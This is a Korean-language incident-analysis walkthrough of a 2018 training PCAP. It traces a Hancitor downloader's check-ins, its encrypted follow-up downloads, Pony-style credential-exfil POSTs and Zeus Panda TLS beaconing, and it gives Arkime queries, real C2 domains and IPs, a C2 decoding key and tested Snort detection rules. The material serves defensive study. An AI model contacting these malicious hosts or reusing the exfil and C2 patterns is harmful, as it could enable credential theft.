file: data   (세 파일 모두)
```

**결과 읽기:**

- **3단계에서 푼 명령의 첫 번째 주소 3개와 정확히 같습니다.** C2 응답(02:08:04) → 1초 뒤 다운로드(02:08:05). 명령과 실행이 트래픽으로 이어져요.
- **`text/plain`인데 내용은 바이너리(`data`)입니다.** 서버가 알려 주는 Content-Type은 서버 마음대로라서 믿으면 안 돼요. Arkime에서는 **http.bodymagic**(내용을 보고 판단한 종류)을 같이 보세요.
- **`MZ`로 시작하지 않습니다.** Windows 실행 파일은 항상 `MZ`로 시작하는데, 이 파일들은 암호화돼 있어서 아니에요. "EXE 다운로드"를 찾는 보안 장비를 피하려는 것이고, PC 안의 다운로더가 받은 뒤에 풀어서 실행합니다. 그래서 이 해시는 **네트워크에서 본 암호화된 파일**의 해시이고, 디스크에 풀린 실행 파일의 해시와는 다릅니다. 티켓에 그렇게 적어야 호스트 오퍼레이터가 헷갈리지 않아요.
- **Last-Modified가 하루 전(2018-05-10)이고 7초 간격**입니다. 공격자가 전날 해킹한 사이트에 세 파일을 한꺼번에 올린 흔적으로 보여요.
- 파일을 받은 뒤 새로 생긴 통신이 무엇인지가 다음 단서입니다. 직후 3초 안에 **MSIE 7.0 User-Agent의 POST 2개**([5단계](#exfil))가, 2분 뒤에는 **처음 보는 TLS 서버**([6단계](#tls-c2))가 나타납니다. 새 프로그램이 돌기 시작했다는 뜻이에요.

**티켓 기록 (4단계):**

```text
[2355 261119, Sung] – Looking for follow-up downloads by 10.0.14.129 ordered by the C2 – Found – Further Analysis Required
```

---

## 5단계 — 정보 유출: 바이너리 POST 2개 { #exfil }

**결과:** 다운로드 직후 같은 C2 서버로 **다른 프로그램**이 암호화된 데이터를 2번(206 + 234바이트) 보냈습니다. 헤더 모양이 비밀번호 탈취 악성코드 Pony의 전송 방식과 일치해요. 내용은 암호화돼 무엇이 나갔는지 트래픽만으로는 모릅니다.

**쿼리:**

```text
ip.src == 10.0.14.129 && http.request.content-type == application/octet-stream
```

- `http.request.content-type` — **요청**(PC가 보낸 쪽) 본문의 종류. 3-1에서 본 `application/octet-stream (2)`를 클릭하고 **and**를 고르면 자동으로 들어가요.

→ 세션 **2개**. 둘 다 펼쳐서 요청 헤더를 봅니다.

**결과:**

```text
02:08:12  10.0.14.129:49200 -> 185.43.223.6:80
POST /mlu/forum.php HTTP/1.0
Host: lysedsohap.com
Accept: */*
Accept-Encoding: identity, *;q=0
Accept-Language: en-US
Content-Length: 206
Content-Type: application/octet-stream
Connection: close
Content-Encoding: binary
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; ...)

(206바이트 바이너리 — 읽을 수 없음)

02:08:14  10.0.14.129:49202 -> 185.43.223.6:80
POST /d2/about.php HTTP/1.0
... (같은 헤더 모양)  Content-Length: 234
```

**결과 읽기 — 체크인([3단계](#checkin))과 비교:**

| 항목 | 체크인 `/4/forum.php` | 이번 POST 2개 |
|---|---|---|
| HTTP 버전 | 1.1 | **1.0** |
| User-Agent | IE11 (`rv:11.0`) | **MSIE 7.0** |
| 본문 | 읽을 수 있는 `GUID=...` | **암호화된 바이너리** |
| 특이한 헤더 | 없음 | `Content-Encoding: binary` |
| 횟수 | 2분마다 반복 | **딱 한 번씩** |

- **같은 서버, 다른 프로그램입니다.** 헤더 습관이 완전히 달라요. 4단계에서 받은 파일 중 하나가 실행돼서 보낸 것으로 보입니다(마지막 다운로드 02:08:14 직후).
- **`Content-Encoding: binary`는 HTTP 표준에 없는 값**이에요(표준은 gzip, deflate 등). 이런 "어색한 헤더"는 특정 악성코드의 지문 같은 것이라 Snort 룰로 잡기 좋습니다. 이 헤더 조합과 `MSIE 7.0` User-Agent는 비밀번호 탈취 악성코드 **Pony**의 알려진 특징입니다.
- **한 번만 보내고 끝**난 것도 특징이에요. Pony는 실행되면 브라우저·메일·FTP 프로그램에 저장된 비밀번호를 모아 한 번에 보내고 사라지는 경우가 많습니다.
- **보낸 양이 작습니다(합계 440바이트).** 저장된 비밀번호가 적었거나 없었을 수도 있어요. 하지만 **무엇이 나갔는지 확인할 수 없으니 "나갔다"고 보고** faith.hoffman의 비밀번호 변경을 권고합니다. 보안에서는 모르면 나쁜 쪽으로 가정해요.
- 티켓에는 계열 이름을 "consistent with Pony – unconfirmed" 처럼 추정으로 씁니다. 폐쇄망이라 해시 조회나 샌드박스로 확인하지 못했으니까요.

**티켓 기록 (5단계):**

```text
[0004 261120, Sung] – Looking for data sent out by 10.0.14.129 to lysedsohap.com other than check-ins (exfil) – Found
```

---

## 6단계 — TLS C2: robwassotdint[.]ru와 자체 서명 인증서 { #tls-c2 }

**결과:** 다운로드 2분 뒤(02:10:16)부터 PC는 `robwassotdint[.]ru`(185.174.175.14:443)에 **약 5분마다 묶음으로 TLS 세션 54개**를 열었습니다. 서버는 OpenSSL 기본값 그대로인 **자체 서명 인증서**(`Default Company Ltd`)를 썼고, PC는 약 1.65 MB를 받았어요. 내용은 암호화돼 보이지 않지만, 패턴은 은행 트로이목마(Zeus Panda Banker 유형)의 HTTPS C2와 일치합니다.

### 6-1. TLS 전체 보기 { #tls-overview }

**쿼리:**

```text
ip.src == 10.0.14.129 && protocols == tls
```

→ **SPIView** → **tls** 섹션과 **cert** 섹션(안 보이면 Load All).

**결과:**

```text
Host (SNI)    robwassotdint.ru (54)   www.google.com (1)
Dst IP        185.174.175.14 (54)   216.58.193.68 (1)
Version       TLSv1.2 (55)
Cipher        TLS_RSA_WITH_AES_128_CBC_SHA256 (54)   ...(google 1)
Cert Issuer   Default Company Ltd / Default City / XX  (54)
              Google Internet Authority G3 (1)
Cert Subject  Default Company Ltd / Default City / XX  (54)
              www.google.com (1)
Not Before    2018-04-29 19:20:31   Not After  2023-10-20 19:20:31
```

- **SNI** — TLS를 시작할 때 PC가 **암호화 전에 평문으로** 보내는 "접속하려는 사이트 이름"이에요. 내용은 암호화돼도 이름은 보입니다. Arkime는 SNI를 호스트 필드에 넣어서 `host == robwassotdint.ru`로도 찾을 수 있어요.
- **Issuer**(발급자) — 인증서를 누가 보증했나. **Subject**(주체) — 인증서가 누구 것인가.

**결과 읽기:**

- **Issuer와 Subject가 같습니다 = 자체 서명.** 서버가 스스로 만든 인증서라서 브라우저가 보면 경고를 띄워요. 정상 웹사이트는 google처럼 공인 기관(CA)의 인증서를 씁니다.
- **`Default Company Ltd`, `Default City`, 국가 `XX`** — OpenSSL로 인증서를 만들 때 아무것도 입력하지 않고 엔터만 치면 들어가는 **기본값**이에요. 서버를 대충 빨리 세운 공격자에게서 자주 보이는 모양입니다. (앞의 [IcedID 사례](icedid-tds-gzip-loader-backconnect.md)의 `Internet Widgits`도 같은 종류예요.)
- **인증서 이름에 도메인이 없습니다.** SNI는 robwassotdint[.]ru인데 인증서에는 CN도 그 이름도 없어요. 정상이라면 일치해야 합니다.
- **발급일 2018-04-29** — 캡처 12일 전에 만든 새 인증서예요. 신선한 인프라도 악성의 단서입니다.
- 인증서가 평문으로 보이는 건 이 시절(TLS 1.2)의 특징이에요. TLS 1.3에서는 인증서도 암호화돼서 보이지 않습니다.

### 6-2. 접속 패턴 보기 { #tls-pattern }

**쿼리:**

```text
ip.src == 10.0.14.129 && ip.dst == 185.174.175.14
```

→ **Sessions** 탭을 **Start Time**으로 정렬하고 **Dst Bytes** 열을 봅니다. 화면 위쪽의 막대 그래프(세션 수의 시간 분포)도 이 쿼리로 바뀝니다.

**결과 (시간대별 세션 수):**

```text
시각(묶음 시작)   세션 수   비고
02:10:16          4
02:15:20          4
02:20:16          6
02:25:27          4
02:30:18          6
02:35:35          4
02:40:16         14         여기서 큰 다운로드: 세션당 159 – 206 KB
02:42:27          8         세션당 최대 524 KB, 421 KB
02:45:43          4
합계             54         보냄 약 120 KB / 받음 약 1.65 MB
```

**결과 읽기:**

- **약 5분 간격의 묶음**입니다. 묶음마다 세션이 2개씩 짝을 이루고, 작은 세션은 받은 양이 1,442바이트로 거의 똑같아요. 기계가 도는 **비콘**입니다.
- **02:40–02:42에 큰 세션**이 몰려 있습니다. 비콘만 하던 C2가 설정 파일이나 추가 모듈을 내려보낸 것으로 보여요. 은행 트로이목마는 여기서 "어느 은행 사이트에 가짜 입력창을 끼워 넣을지(웹인젝트)"를 받습니다.
- **보낸 양(120 KB)은 받은 양(1.65 MB)보다 훨씬 적어요.** 큰 유출은 보이지 않습니다. 하지만 암호화돼 있으니 작은 양의 유출(비밀번호 등)은 있었을 수 있어요.
- **시작 시간이 4단계 다운로드 직후**입니다. 02:10:16에 PC가 robwassotdint[.]ru를 DC(10.0.14.3)에 물었고, 답 185.174.175.14로 곧바로 접속했어요. 다운로드 전에는 이 이름을 한 번도 묻지 않았습니다. 그래서 "다운로드한 파일이 실행돼 새 C2에 붙었다"고 판단합니다.
- `www.google.com` TLS 1개(02:20:16)는 구글의 정상 인증서이고 한 번뿐이라 티켓에 넣지 않아요. 호스트에서 필요하면 볼 수 있도록 분석 메모에만 남깁니다.

**티켓 기록 (6단계):**

```text
[0018 261120, Sung] – Investigating repeated TLS sessions from 10.0.14.129 to robwassotdint.ru (185.174.175.14) for C2 – Found – Further Analysis Required

[0026 261120, Sung] – Checking the TLS certificate presented by 185.174.175.14 – Found
```

---

## 7단계 — 타임라인: 사건을 시간 순서로 잇기 { #timeline }

**결과:** 사용자가 로그인하고 **35초 뒤에** 악성 활동이 시작됐고, 그로부터 **약 11초 안에** 체크인, 다운로드, 유출이 모두 끝났습니다. 두 C2는 캡처가 끝날 때까지 살아 있었어요. 시간은 모두 2018-05-11 UTC입니다.

| 시각 (UTC) | 사건 | 근거 (Arkime) |
|---|---|---|
| 02:06:51 | PC 시작/네트워크 연결, DHCP REQUEST (0.0.0.0 → 브로드캐스트) | `protocols == dhcp` |
| 02:07:02 | Windows 인터넷 연결 확인 (msftncsi) — 정상 | `host.http == www.msftncsi.com` |
| 02:07:29 | **faith.hoffman 로그인** (Kerberos) | `protocols == krb5` |
| 02:08:04 | **api.ipify[.]org로 공인 IP 확인** → 0.5초 뒤 **lysedsohap[.]com 첫 체크인** (다운로드 명령 수신) | `host.http == lysedsohap.com` |
| 02:08:05 – 02:08:15 | **wansaiful[.]com에서 암호화 파일 3개 다운로드** | `host.http == wansaiful.com` |
| 02:08:12, 02:08:14 | **암호화 POST 2개** `/mlu/forum.php`, `/d2/about.php` (비밀번호 유출 추정) | `http.request.content-type == application/octet-stream` |
| 02:10:15 | lysedsohap[.]com 체크인 재개, 이후 약 2분마다 (`{n:}` 대기) | 같은 쿼리 |
| 02:10:16 | **robwassotdint[.]ru 첫 DNS 질문 → 첫 TLS 세션** | `host == robwassotdint.ru` |
| 02:10 – 02:45 | TLS 비콘 약 5분마다, 총 54세션 | `ip.dst == 185.174.175.14` |
| 02:40 – 02:42 | **TLS C2에서 큰 다운로드** (세션당 최대 524 KB) | Dst Bytes 열 |
| 02:45:46 | 마지막 TLS C2 세션 시작 | — |
| 02:48:25 | 마지막 lysedsohap[.]com 체크인 (캡처 끝 02:49:40) | — |

**결과 읽기:**

- **최초 감염 경로는 이 PCAP에 없습니다.** 메일, 문서 다운로드, Office 통신이 하나도 없어요. 앞 사례에서는 EXE 다운로드 직전에 Office DNS 질문이 보였는데, 이번에는 그런 단서가 없습니다.
- **가능성은 두 가지**입니다. ① 캡처 전에 이미 감염되어 있었고, 로그인할 때 자동 실행(지속성)됐다. ② 로그인 직후 사용자가 이미 받아 둔 문서를 열었다. 로그인 35초 뒤라는 시간은 ①에 더 가까워 보이지만, 트래픽만으로는 구별할 수 없어요.
- 그래서 티켓에는 "최초 감염 경로 미확인, 호스트 확인 필요"라고 쓰고, 호스트 오퍼레이터가 볼 곳(시작 프로그램, 예약 작업, 최근 연 문서, 메일 첨부 파일)을 적어 줍니다.
- **측면 이동은 없습니다.** DC와의 통신은 로그인, DNS, 그룹 정책 읽기뿐이고, 다른 내부 PC는 캡처에 없어요.

**티켓 기록 (7단계):**

```text
[0010 261120, Sung] – Looking for activity on 10.0.14.129 preceding the first C2 check-in (initial access) – Not Found
```

`Not Found`도 결과입니다. "찾아봤는데 트래픽에는 없었다"를 적어 두면 다음 사람이 같은 걸 다시 찾지 않아도 돼요.

---

## 8단계 — Snort 룰과 테스트 결과 { #snort }

**결과:** 룰 8개를 PCAP으로 테스트했더니 모두 **미리 적어 둔 예상 개수와 정확히 같은 만큼** 울렸고, 정상 트래픽(DC, 구글, msftncsi)에서는 하나도 안 울렸습니다. (Snort 2.9.20, `HOME_NET 10.0.14.0/24`)

### 룰 목록 { #snort-rules }

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor-style check-in POST to /4/forum.php - Sung"; flow:to_server,established; content:"POST"; http_method; content:"/4/forum.php"; http_uri; content:"GUID="; http_client_body; depth:5; content:"&BUILD="; http_client_body; distance:0; content:"&INFO="; http_client_body; distance:0; classtype:trojan-activity; sid:1000011; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor follow-up payload download from wansaiful.com - Sung"; flow:to_server,established; content:"GET"; http_method; content:"/wp-content/plugins/easy-media-download/"; http_uri; content:"wansaiful.com"; http_header; classtype:trojan-activity; sid:1000012; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Pony-style credential exfil POST with Content-Encoding binary - Sung"; flow:to_server,established; content:"POST"; http_method; content:"Content-Type|3a| application/octet-stream"; http_header; content:"Content-Encoding|3a| binary"; http_header; classtype:trojan-activity; sid:1000013; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"TLS Client Hello SNI robwassotdint.ru (Zeus Panda C2) - Sung"; flow:to_server,established; content:"|16 03|"; depth:2; content:"|01|"; offset:5; depth:1; content:"robwassotdint.ru"; nocase; classtype:trojan-activity; sid:1000014; rev:1;)

alert tcp $EXTERNAL_NET 443 -> $HOME_NET any (msg:"TLS certificate with OpenSSL default subject Default Company Ltd from external server - Sung"; flow:to_client,established; content:"Default Company Ltd"; classtype:bad-unknown; sid:1000015; rev:1;)

alert udp $HOME_NET any -> any 53 (msg:"DNS query for Hancitor C2 lysedsohap.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0a|lysedsohap|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000016; rev:1;)

alert udp $HOME_NET any -> any 53 (msg:"DNS query for Zeus Panda C2 robwassotdint.ru - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0d|robwassotdint|02|ru|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000017; rev:1;)

alert udp $HOME_NET any -> any 53 (msg:"DNS query for Hancitor payload host wansaiful.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|09|wansaiful|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000018; rev:1;)
```

### 룰 하나 뜯어 보기 (sid 1000011) { #rule-anatomy }

| 부분 | 뜻 |
|---|---|
| `alert tcp` | TCP 패킷을 검사하고, 맞으면 알림 |
| `$HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS` | 내부 아무 포트 → 외부 웹 포트(80 등). 방향이 중요해요 |
| `flow:to_server,established` | TCP 연결이 맺어진 뒤, 서버 쪽으로 가는 데이터만 |
| `content:"POST"; http_method` | HTTP 메서드가 POST |
| `content:"/4/forum.php"; http_uri` | URI에 `/4/forum.php`가 있음 |
| `content:"GUID="; http_client_body; depth:5` | 요청 **본문의 맨 앞 5바이트**가 `GUID=` |
| `content:"&BUILD="; ... distance:0` | 그 뒤 어딘가에 `&BUILD=` (`distance:0` = 앞 조건이 끝난 곳부터 찾기) |
| `content:"&INFO="` | 그 뒤에 `&INFO=` |
| `classtype:trojan-activity` | 분류: 트로이목마 활동 |
| `sid:1000011; rev:1` | 룰 번호(사용자 룰은 1000000 이상)와 수정 판 |

- **왜 URI만 보지 않나요?** `/4/forum.php`는 정상 게시판에도 있을 수 있는 주소예요. 본문의 `GUID=...&BUILD=...&INFO=` 구조까지 보면 오탐이 크게 줄고, 공격자가 도메인을 바꿔도 잡혀요.
- **sid 1000013**은 도메인이나 URI 없이 어색한 헤더 조합(`octet-stream` + `Content-Encoding: binary`)만 봅니다. 이런 **행동 룰**은 다른 서버를 쓰는 같은 악성코드도 잡을 수 있어요.
- **sid 1000014**는 TLS Client Hello(`|16 03|` = TLS 핸드셰이크, 6번째 바이트 `|01|` = Client Hello) 안의 SNI 이름을 봅니다. 암호화 전이라 보여요.
- **sid 1000015**는 반대 방향(서버 → PC)의 인증서에서 `Default Company Ltd`를 찾습니다. 악성만 잡는 룰은 아니어서(테스트 서버도 이럴 수 있음) 분류를 `bad-unknown`으로 낮췄어요.
- DNS 룰(1000016–1000018)의 `|01 00 00 01 00 00 00 00 00 00|`는 "일반 질문 1개, 답 0개"라는 DNS 헤더예요. 그래서 **질문**만 잡고 답은 안 잡습니다. `|0a|lysedsohap|03|com|00|`은 DNS가 이름을 저장하는 방식(글자 수 + 글자)입니다. `0a` = 10글자 `lysedsohap`, `03` = 3글자 `com`, `00` = 끝.

### 테스트 { #snort-test }

```bash
sudo snort -T -c /etc/snort/snort.conf
sudo snort -c /etc/snort/snort.conf -r 2018-05-11-traffic-analysis-exercise.pcap -A console -q -k none -U -l /tmp/snorttest | grep -o "\[1:[0-9]*:[0-9]*\] [^[]*" | sort | uniq -c
```

- `-T` — 설정과 룰 문법만 검사. `-r` — PCAP 파일을 읽음. `-A console` — 알림을 화면에 출력. `-q` — 조용히. `-k none` — 체크섬 오류가 있는 패킷도 검사(캡처 파일에는 흔함). `-U` — 시간을 UTC로.
- `grep | sort | uniq -c` — 알림을 sid별로 세어줍니다.

**결과 (예상 개수와 비교):**

| sid | 룰 | 예상 | 실제 |
|---|---|---|---|
| 1000011 | Hancitor 체크인 | 21 (`/4/forum.php` POST) | **21** |
| 1000012 | wansaiful.com 다운로드 | 3 (요청 3개) | **3** |
| 1000013 | Pony 유형 유출 POST | 2 | **2** |
| 1000014 | SNI robwassotdint.ru | 54 (TLS 세션) | **54** |
| 1000015 | `Default Company Ltd` 인증서 | 54 | **54** |
| 1000016 | DNS lysedsohap.com | 2 (질문 패킷) | **2** |
| 1000017 | DNS robwassotdint.ru | 2 | **2** |
| 1000018 | DNS wansaiful.com | 1 | **1** |

- 예상 개수는 룰을 돌리기 **전에** Arkime(또는 tshark)에서 세어 둡니다. 실제가 더 많으면 오탐, 적으면 놓친 것이니 룰을 고칩니다.
- sid 1000011이 23이 아니라 21인 것도 확인하세요. 같은 서버로 간 Pony POST 2개는 `GUID=`로 시작하지 않아서 제외돼야 맞아요.

---

## 침해사고 티켓 { #ticket }

감염 호스트 하나의 활동을 **티켓 하나**에 모았어요. Hancitor C2, 후속 다운로드, 정보 유출, TLS C2가 모두 들어 있습니다. 작업자 이름, 티켓 링크, 증거 경로는 자리표시이고, 작업 로그 시각은 예시입니다. 티켓 본문은 팀 양식대로 영어로 씁니다.

- Description은 두 문단입니다. 첫 문단은 HTTP 단계(체크인·다운로드·유출), 둘째 문단은 HTTPS C2와 남은 일이에요.
- 설명(DESCRIPTION)의 도메인은 `[.]`로 무력화했고, 도구 출력과 쿼리는 그대로 둡니다.
- 베이스라인(DHCP, Kerberos, DNS)은 작업 로그에 넣지 않고 IMPACTED MACHINES 칸에만 반영했습니다.

[:material-download: 티켓 txt 파일 내려받기](files/180511_CHICAGO-7FA3-PC_ticket.txt){ .md-button }

```text
--8<-- "docs-ko/blueteam/investigations/files/180511_CHICAGO-7FA3-PC_ticket.txt"
```

---

## 복사용 쿼리 모음 { #query-sheet }

**Arkime**

```text
protocols == dhcp
protocols == krb5
protocols == dns
protocols == http
protocols == tls
ip.src == 10.0.14.129 && ip.dst != [10.0.0.0/8, 224.0.0.0/4, 255.255.255.255]
ip.src == 10.0.14.129 && host.http == lysedsohap.com
ip.src == 10.0.14.129 && host.http == lysedsohap.com && http.uri == *4/forum.php*
ip.src == 10.0.14.129 && host.http == wansaiful.com
ip.src == 10.0.14.129 && host.http == api.ipify.org
ip.src == 10.0.14.129 && http.request.content-type == application/octet-stream
ip.src == 10.0.14.129 && host.dns == [lysedsohap.com, wansaiful.com]
ip.src == 10.0.14.129 && ip.dst == 185.174.175.14
ip.src == 10.0.14.129 && ip.dst == 185.174.175.14 && port.dst == 443
host == robwassotdint.ru
host.dns == robwassotdint.ru
cert.issuer.on == "Default Company Ltd"
```

**CyberChef (Hancitor C2 응답)**

```text
From Base64  →  XOR (Key: 7a, HEX)
```

**분석 VM**

```bash
TZ=UTC capinfos 2018-05-11-traffic-analysis-exercise.pcap
sha256sum 2018-05-11-traffic-analysis-exercise.pcap
tshark -r 2018-05-11-traffic-analysis-exercise.pcap --export-objects http,http_objects
sha256sum http_objects/*
```

---

## 배운 점 { #lessons }

1. **도메인 환경에서는 Kerberos가 사용자를 알려 줍니다.** `$`로 끝나면 컴퓨터 계정, 없으면 사람 계정이에요. 이번에는 악성코드가 C2에 보낸 `INFO=`가 같은 사용자를 한 번 더 확인해 줬습니다.
2. **정상 서비스도 악성 활동의 일부일 수 있어요.** api.ipify[.]org 자체는 정상이지만, 0.5초 뒤 그 답이 C2로 갔습니다. "무엇에 접속했나"보다 "앞뒤로 무엇이 있었나"가 중요해요.
3. **비콘은 간격으로 드러납니다.** HTTP는 약 120초, TLS는 약 5분 묶음이었어요. Sessions 탭을 Start Time으로 정렬하고 시각만 나열해 보면 됩니다.
4. **암호화돼 있어도 패턴과 메타데이터는 보입니다.** TLS 내용은 못 봤지만 SNI, 자체 서명 기본값 인증서, 간격, 바이트 수만으로 C2라고 판단했어요.
5. **Content-Type을 믿지 마세요.** `text/plain`이라던 파일은 암호화된 바이너리였습니다. 네트워크에서 본 해시와 디스크의 해시가 다를 수 있다는 것도 티켓에 적어야 해요.
6. **같은 서버라도 헤더 습관이 다르면 다른 프로그램입니다.** HTTP 1.1/1.0, User-Agent, `Content-Encoding: binary` 차이로 체크인과 유출을 나눴습니다.
7. **감염 사슬을 따라가세요.** 다운로더(Hancitor) → 명령 → 다운로드 → 다음 악성코드(정보 탈취, 은행 트로이목마). 다운로드 직후 처음 나타나는 목적지는 거의 항상 다음 단계예요.
8. **못 찾은 것도 적습니다.** 최초 감염 경로는 PCAP에 없었어요. "Not Found + 호스트에서 볼 곳"을 적어서 호스트 오퍼레이터에게 넘깁니다.

## 참고 { #references }

- [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Arkime로 PCAP 분석하기](../../network/arkime/offline-pcap-guide.md)
- [비콘과 C2](../../network/beaconing-c2.md) · [Wireshark & tshark](../../network/wireshark-tshark.md)
- [PCAP 실습 06 — 청구서 Word 매크로에서 Hancitor 유형 C2까지](pcap-lab-06-invoice-macro-c2.md) · [Back to the Present](back-to-the-present-chthonic-c2-tech-support-scam.md) · [IcedID (Cold as Ice)](icedid-tds-gzip-loader-backconnect.md)
- [플레이북: 감염된 워크스테이션](../playbooks/compromised-workstation.md)
- 원본 실습: [malware-traffic-analysis.net — 2018-05-11 Traffic Analysis Exercise: Night Dew](https://malware-traffic-analysis.net/2018/05/11/index.html) · [정답 페이지](https://malware-traffic-analysis.net/2018/05/11/page2.html)
- 같은 주의 Hancitor + Zeus Panda Banker 감염 기록: [malware-traffic-analysis.net — 2018-05-14](https://malware-traffic-analysis.net/2018/05/14/index.html)
- 같은 C2 URL(`/4/forum.php`, `/mlu/forum.php`, `/d2/about.php`)을 Hancitor/Pony C2로 정리한 공개 목록: [Pastebin — HANCITOR](https://pastebin.com/HV3JCi5f)
